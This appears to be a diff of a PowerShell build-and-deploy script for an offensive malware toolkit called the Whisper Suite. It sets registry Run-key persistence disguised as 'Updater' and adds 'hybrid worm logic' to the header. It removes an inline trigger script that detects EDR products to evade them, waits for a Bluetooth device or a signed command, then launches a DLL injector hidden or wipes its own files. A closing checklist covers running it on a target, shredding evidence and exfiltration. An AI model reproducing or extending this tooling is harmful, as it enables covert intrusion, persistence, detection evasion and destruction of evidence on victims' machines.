@@ -1,6 +1,6 @@
 # BuildDeployWhisper.ps1
 # Master build + deployment script for the Whisper Suite
-# Includes compilation, polymorphism, persistence, and BLE trigger
+# Includes compilation, polymorphism, persistence, BLE trigger, and hybrid worm logic
 
 $baseDir = "$PSScriptRoot"
 $ghostKeyDLL = "$baseDir\GhostKey\bin\Release\GhostKey.dll"
@@ -55,7 +55,7 @@ function Setup-Persistence {
     $execCommand = "$injectorPath $payloadPath"
 
     try {
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value $execCommand -Force
+        Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value $execCommand -Force
         Write-Host "[+] Registry persistence set (HKCU Run key)."
     } catch {
         Write-Host "[-] Failed to create registry persistence: $_"
@@ -72,59 +72,7 @@ function Setup-Persistence {
 
 function Deploy-BLETrigger {
     Write-Host "[*] Creating BLE-based trigger script with encrypted handshake, EDR evasion, and command validation..."
-    $bleScript = @"
-# BLETrigger.ps1 — Secure Trigger with EDR evasion and signed command validation
-
-\$knownDeviceID = "GhostWhisperer"
-\$authToken = "U2FsdGVkX1+RAVEN-OK=="
-\$injectCmd = "$injectorEXE $ghostKeyDLL"
-\$cfgPath = "C:\\ProgramData\\.ghost.cfg"
-\$key = 'RavenLives'
-
-function X([string]\$d,[string]\$k) {
-  \$kb=[Text.Encoding]::UTF8.GetBytes(\$k)
-  \$db=[Text.Encoding]::UTF8.GetBytes(\$d)
-  \$h=New-Object Security.Cryptography.HMACSHA256
-  \$h.Key=\$kb
-  ([BitConverter]::ToString(\$h.ComputeHash(\$db))) -replace '-', ''
-}
-
-function Validate-Cfg {
-  if (!(Test-Path \$cfgPath)) { return \$null }
-  \$j=Get-Content \$cfgPath | ConvertFrom-Json
-  \$c=\$j.command; \$t=\$j.timestamp; \$s=\$j.signature
-  \$dt=[datetime]::Parse(\$t)
-  if ((Get-Date).ToUniversalTime().Subtract(\$dt).TotalMinutes -gt 10) { return \$null }
-  \$check=X "\$c|\$t" \$key
-  if (\$s -eq \$check) { return \$c }
-  return \$null
-}
-
-function Check-EDR {
-  \$x="Crowd,Sentinel,Carbon,Defend,Sophos" -split ","
-  Get-Service | Where-Object { \$x -match \$_.Name -or \$x -match \$_.DisplayName }
-}
-
-function D(\$cmd) {
-  if (\$cmd -eq 'FIRE') {
-    Start-Process -WindowStyle Hidden -FilePath "$injectorEXE" -ArgumentList "$ghostKeyDLL"
-  } elseif (\$cmd -eq 'WIPE') {
-    Remove-Item "$injectorEXE","$ghostKeyDLL","$cleanerPS1" -Force -ErrorAction SilentlyContinue
-  }
-}
-
-if (Check-EDR) { Start-Sleep 300 }
-
-while (\$true) {
-  \$cmd=Validate-Cfg
-  if (\$cmd) { D \$cmd; break }
-  \$d=Get-PnpDevice -Class Bluetooth -Status OK | Where { \$_.FriendlyName -eq \$knownDeviceID }
-  if (\$d -and ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\$authToken)) -eq "RAVEN-OK")) {
-    D 'FIRE'; break
-  }
-  Start-Sleep 5
-}
-"@
+    $bleScript = Get-Content "$baseDir\Templates\BLETrigger_Encrypted.ps1" -Raw
     Set-Content -Path $bleTriggerScript -Value $bleScript
     Write-Host "[+] BLE trigger script created with signature validation and obfuscation."
 }
@@ -142,8 +90,8 @@ function Show-Obfuscation-Checklist {
 function Show-Deployment-Flow {
     Write-Host "`n===== DEPLOYMENT FLOW ====="
     Write-Host "[1] Transfer WhisperSuite_Build to USB or handheld device"
-    Write-Host "[2] On target, run: .\WraithTap.exe GhostKey.dll OR .\BLETrigger.ps1"
-    Write-Host "[3] After operation, run: .\SilentBloom.ps1"
+    Write-Host "[2] On target, run: .\\WraithTap.exe GhostKey.dll OR .\\BLETrigger.ps1"
+    Write-Host "[3] After operation, run: .\\SilentBloom.ps1"
     Write-Host "[4] Ensure GhostKey.dll self-destructed (or wipe manually)"
     Write-Host "[5] Use cipher /w or file shredder to remove residuals"
     Write-Host "[6] If using live USB, format it after exfiltration"
